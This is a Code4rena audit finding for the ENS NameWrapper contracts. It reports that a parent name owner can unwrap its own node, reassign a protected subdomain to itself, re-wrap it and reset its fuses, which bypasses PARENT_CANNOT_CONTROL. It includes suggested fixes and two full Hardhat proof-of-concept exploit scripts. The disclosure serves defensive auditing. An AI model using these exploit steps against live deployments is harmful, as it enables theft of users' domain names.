## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [[PNM-001] `PARENT_CANNOT_CONTROL` can be bypassed by maliciously unwrapping parent node](https://github.com/code-423n4/2022-07-ens-findings/issues/173) 

# Lines of code

https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356
https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L295
https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/registry/ENSRegistry.sol#L74


# Vulnerability details

### Description

By design, for any subdomain, as long as its `PARENT_CANNOT_CONTROL` fuse is burnt (and does not expire), its parent should not be able to burn its fuses or change its owner.

However, this contraint can be bypassed by a parent node maliciously unwrapping itself. As long as the hacker becomes the ENS owner of the parent node, he can leverage `ENSRegistry::setSubnodeOwner` to re-set himself as the ENS owner of the subdomain, and thus re-invoking `NameWrapper.wrap` can rewrite the fuses and wrapper owner of the given subdoamin. 

Considering the following attack scenario:

+ Someone owns a domain (or a 2LD), e.g., _poc.eth_
+ The domain owner assigns a sub-domain to the hacker, e.g., _hack.poc.eth_
     + This sub-domain should not burn `CANNOT_UNWRAP`
     + This sub-domain can burn `PARENT_CANNOT_CONTROL`
+ Hacker assigns a sub-sub-domain to a victim user, e.g., _victim.hack.poc.eth_
+ The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`
     + The hacker should not be able to change the owner and the fuses of `victim.hack.poc.eth` ideally
+ However, the hacker then unwraps his sub-domain, i.e., _hack.poc.eth_
+ The hacker invokes `ENSRegistry::setSubnodeOwner(hacker.poc.eth, victim)` on the sub-sub-domain
     + He can reassign himself as the owner of the _victim.hack.poc.eth_
+ The hacker invokes `NameWrapper.wrap(victim.hacker.poc.eth)` to over-write the fuses and owner of the sub-sub-domain, i.e., _victim.hacker.poc.eth_

The root cause here is that, for any node, when one of its subdomains burns `PARENT_CANNOT_CONTROL`, the node itself fails to burn `CANNOT_UNWRAP`. Theoretically, this should check to the root, which however is very gas-consuming. 

### Notes

Discussed with the project member, Jeff Lau. 

If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.


### Suggested Fix

+ Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped.
+ Potential fix 2: leave fuses as is when unwrapping and re-wrapping, unless name expires. Meanwhile, check the old fuses even wrapping.


### PoC / Attack Scenario

There are two attached PoC files, `poc1.js` and `poc2.js`. The `poc1.js` is for a case where the hacker holds a 2LD, and the `poc2.js` demonstrates the aforementioned scenario.

To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.


#### poc1.js
```javascript
const packet = require('dns-packet')
const { ethers } = require('hardhat')
const { utils } = ethers
const { use, expect } = require('chai')
const { solidity } = require('ethereum-waffle')
const n = require('eth-ens-namehash')
const namehash = n.hash
const { deploy } = require('../test-utils/contracts')
const { keccak256 } = require('ethers/lib/utils')

use(solidity)

const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label))
const ROOT_NODE =
  '0x0000000000000000000000000000000000000000000000000000000000000000'

const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'

function encodeName(name) {
  return '0x' + packet.name.encode(name).toString('hex')
}

const CANNOT_UNWRAP = 1
const CANNOT_BURN_FUSES = 2
const CANNOT_TRANSFER = 4
const CANNOT_SET_RESOLVER = 8
const CANNOT_SET_TTL = 16
const CANNOT_CREATE_SUBDOMAIN = 32
const PARENT_CANNOT_CONTROL = 64
const CAN_DO_EVERYTHING = 0

describe('PoC 1', () => {
  let ENSRegistry
  let BaseRegistrar
  let NameWrapper
  let NameWrapperV
  let MetaDataservice
  let signers
  let dev
  let victim
  let hacker
  let result
  let MAX_EXPIRY = 2n ** 64n - 1n

  before(async () => {
    signers = await ethers.getSigners()
    dev = await signers[0].getAddress()
    victim = await signers[1].getAddress()
    hacker = await signers[2].getAddress()

    EnsRegistry = await deploy('ENSRegistry')
    EnsRegistryV = EnsRegistry.connect(signers[1])
    EnsRegistryH = EnsRegistry.connect(signers[2])

    BaseRegistrar = await deploy(
      'BaseRegistrarImplementation',
      EnsRegistry.address,
      namehash('eth')
    )

    await BaseRegistrar.addController(dev)
    await BaseRegistrar.addController(victim)

    MetaDataservice = await deploy(
      'StaticMetadataService',
      'https://ens.domains'
    )

    NameWrapper = await deploy(
      'NameWrapper',
      EnsRegistry.address,
      BaseRegistrar.address,
      MetaDataservice.address
    )
    NameWrapperV = NameWrapper.connect(signers[1])
    NameWrapperH = NameWrapper.connect(signers[2])

    // setup .eth
    await EnsRegistry.setSubnodeOwner(
      ROOT_NODE,
      labelhash('eth'),
      BaseRegistrar.address
    )

    //make sure base registrar is owner of eth TLD
    expect(await EnsRegistry.owner(namehash('eth'))).to.equal(
      BaseRegistrar.address
    )
  })

  beforeEach(async () => {
    result = await ethers.provider.send('evm_snapshot')
  })
  afterEach(async () => {
    await ethers.provider.send('evm_revert', [result])
  })

  describe('subdomain can be re-wrapped', () => {
    before(async () => {
      await BaseRegistrar.addController(NameWrapper.address)
      await NameWrapper.setController(dev, true)
    })

    it('a passed test denotes a successful attack', async () => {
      const label = 'register'
      const labelHash = labelhash(label)
      const wrappedTokenId = namehash(label + '.eth')

      // register a 2LD domain for the hacker
      await NameWrapper.registerAndWrapETH2LD(
        label,
        hacker,
        86400,
        EMPTY_ADDRESS,
        CAN_DO_EVERYTHING,
        MAX_EXPIRY
      )
      expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(
        NameWrapper.address
      )
      expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(
        NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)

      // hacker signed a submomain for a victim user
      const subLabel = 'hack'
      const subLabelHash = labelhash(subLabel)
      const wrappedSubTokenId = namehash(subLabel + '.' + label + '.eth')
      await NameWrapperH.setSubnodeOwner(
        wrappedTokenId,
        subLabel,
        victim,
        PARENT_CANNOT_CONTROL,
        MAX_EXPIRY
      )
      expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(
          NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(victim)
      expect(
          (await NameWrapper.getFuses(wrappedSubTokenId))[0]
      ).to.equal(PARENT_CANNOT_CONTROL)

      // the user sets a very strict fuse for the wrappedSubTokenId
      await NameWrapperV.setFuses(wrappedSubTokenId, 127 - PARENT_CANNOT_CONTROL) // 63
      expect((await NameWrapper.getFuses(wrappedSubTokenId))[0]).to.equal(127)

      // the hacker unwraps his 2LD token
      await NameWrapperH.unwrapETH2LD(labelHash, hacker, hacker)
      expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(hacker)
      expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(hacker)

      // the hacker setSubnodeOwner
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId, subLabelHash, hacker)
      expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)

      // the hacker re-wrap the sub node
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(
          encodeName(subLabel + '.' + label + '.eth'),
          hacker,
          EMPTY_ADDRESS
      )

      ///////////////////////////
      // Attack successed!
      ///////////////////////////

      // XXX: [1] the owner of wrappedSubTokenId transfer from the victim to the hacker
      // XXX: [2] the fuses of wrappedSubTokenId becomes 0 from full-protected
      expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)
      expect((await NameWrapper.getFuses(wrappedSubTokenId))[0]).to.equal(0)
    })
  })
})
```

#### poc2.js
```javascript
const packet = require('dns-packet')
const { ethers } = require('hardhat')
const { utils } = ethers
const { use, expect } = require('chai')
const { solidity } = require('ethereum-waffle')
const n = require('eth-ens-namehash')
const namehash = n.hash
const { deploy } = require('../test-utils/contracts')
const { keccak256 } = require('ethers/lib/utils')

use(solidity)

const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label))
const ROOT_NODE =
  '0x0000000000000000000000000000000000000000000000000000000000000000'

const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'

function encodeName(name) {
  return '0x' + packet.name.encode(name).toString('hex')
}

const CANNOT_UNWRAP = 1
const CANNOT_BURN_FUSES = 2
const CANNOT_TRANSFER = 4
const CANNOT_SET_RESOLVER = 8
const CANNOT_SET_TTL = 16
const CANNOT_CREATE_SUBDOMAIN = 32
const PARENT_CANNOT_CONTROL = 64
const CAN_DO_EVERYTHING = 0

describe('PoC 2', () => {
  let ENSRegistry
  let BaseRegistrar
  let NameWrapper
  let NameWrapperV
  let MetaDataservice
  let signers
  let dev
  let victim
  let hacker
  let result
  let MAX_EXPIRY = 2n ** 64n - 1n

  before(async () => {
    signers = await ethers.getSigners()
    dev = await signers[0].getAddress()
    victim = await signers[1].getAddress()
    hacker = await signers[2].getAddress()

    EnsRegistry = await deploy('ENSRegistry')
    EnsRegistryV = EnsRegistry.connect(signers[1])
    EnsRegistryH = EnsRegistry.connect(signers[2])

    BaseRegistrar = await deploy(
      'BaseRegistrarImplementation',
      EnsRegistry.address,
      namehash('eth')
    )

    await BaseRegistrar.addController(dev)
    await BaseRegistrar.addController(victim)

    MetaDataservice = await deploy(
      'StaticMetadataService',
      'https://ens.domains'
    )

    NameWrapper = await deploy(
      'NameWrapper',
      EnsRegistry.address,
      BaseRegistrar.address,
      MetaDataservice.address
    )
    NameWrapperV = NameWrapper.connect(signers[1])
    NameWrapperH = NameWrapper.connect(signers[2])

    // setup .eth
    await EnsRegistry.setSubnodeOwner(
      ROOT_NODE,
      labelhash('eth'),
      BaseRegistrar.address
    )

    //make sure base registrar is owner of eth TLD
    expect(await EnsRegistry.owner(namehash('eth'))).to.equal(
      BaseRegistrar.address
    )
  })

  beforeEach(async () => {
    result = await ethers.provider.send('evm_snapshot')
  })
  afterEach(async () => {
    await ethers.provider.send('evm_revert', [result])
  })

  describe('subdomain can be re-wrapped', () => {
    /*
     * Attack scenario:
     *  + Someone owns a domain (or a 2LD), e.g., poc.eth
     *  + The domain owner assigns a sub-domain to the hacker, e.g., hack.poc.eth
     *      + This sub-domain should not burn `CANNOT_UNWRAP`
     *      + This sub-domain can burn `PARENT_CANNOT_CONTROL`
     *  + Hacker assigns a sub-sub-domain to a victim user, e.g., victim.hack.poc.eth
     *  + The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`
     *  + The hacker unwraps his sub-domain, i.e., hack.poc.eth
     *  + The hacker invokes `ENSRegistry::setSubnodeOwner` on the sub-sub-domain
     *      + He can reassign himself as the owner of the victim.hack.poc.eth
     *  + The sub-sub-domain is now owned by the hacker with more permissive fuses
     */
    before(async () => {
      await BaseRegistrar.addController(NameWrapper.address)
      await NameWrapper.setController(dev, true)
    })

    it('a passed test denotes a successful attack', async () => {
      const label = 'poc'
      const labelHash = labelhash(label)
      const wrappedTokenId = namehash(label + '.eth')

      // register a 2LD domain
      await NameWrapper.registerAndWrapETH2LD(
        label,
        dev,
        86400,
        EMPTY_ADDRESS,
        CAN_DO_EVERYTHING,
        MAX_EXPIRY
      )
      expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(
        NameWrapper.address
      )
      expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(
        NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(dev)

      // signed a submomain for the hacker
      const subLabel = 'hack'
      const subLabelHash = labelhash(subLabel)
      const subDomain = subLabel + '.' + label + '.eth'
      const wrappedSubTokenId = namehash(subDomain)
      await NameWrapper.setSubnodeOwner(
        wrappedTokenId,
        subLabel,
        hacker,
        PARENT_CANNOT_CONTROL,
        MAX_EXPIRY
      )
      expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(
          NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)
      expect(
          (await NameWrapper.getFuses(wrappedSubTokenId))[0]
      ).to.equal(PARENT_CANNOT_CONTROL)

      // hacker signed a subsubmomain for a victim user
      const subSubLabel = 'victim'
      const subSubLabelHash = labelhash(subSubLabel)
      const subSubDomain = subSubLabel + '.' + subDomain
      const wrappedSubSubTokenId = namehash(subSubDomain)
      await NameWrapperH.setSubnodeOwner(
        wrappedSubTokenId,
        subSubLabel,
        victim,
        PARENT_CANNOT_CONTROL,
        MAX_EXPIRY
      )
      expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(
          NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(victim)
      expect(
          (await NameWrapper.getFuses(wrappedSubSubTokenId))[0]
      ).to.equal(PARENT_CANNOT_CONTROL)

      // the user sets a very strict fuse for the wrappedSubSubTokenId
      await NameWrapperV.setFuses(wrappedSubSubTokenId, 127 - PARENT_CANNOT_CONTROL) // 63
      expect((await NameWrapper.getFuses(wrappedSubSubTokenId))[0]).to.equal(127)

      // the hacker unwraps his wrappedSubTokenId
      await NameWrapperH.unwrap(wrappedTokenId, subLabelHash, hacker)
      expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)

      // the hacker setSubnodeOwner, to set the owner of wrappedSubSubTokenId as himself
      await EnsRegistryH.setSubnodeOwner(wrappedSubTokenId, subSubLabelHash, hacker)
      expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(hacker)

        // the hacker re-wrap the sub sub node
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName(subSubDomain), hacker, EMPTY_ADDRESS)

      // ///////////////////////////
      // // Attack successed!
      // ///////////////////////////

      // XXX: [1] the owner of wrappedSubTokenId transfer from the victim to the hacker
      // XXX: [2] the fuses of wrappedSubTokenId becomes 0 from full-protected
      expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(hacker)
      expect((await NameWrapper.getFuses(wrappedSubSubTokenId))[0]).to.equal(0)
    })
  })
})
```

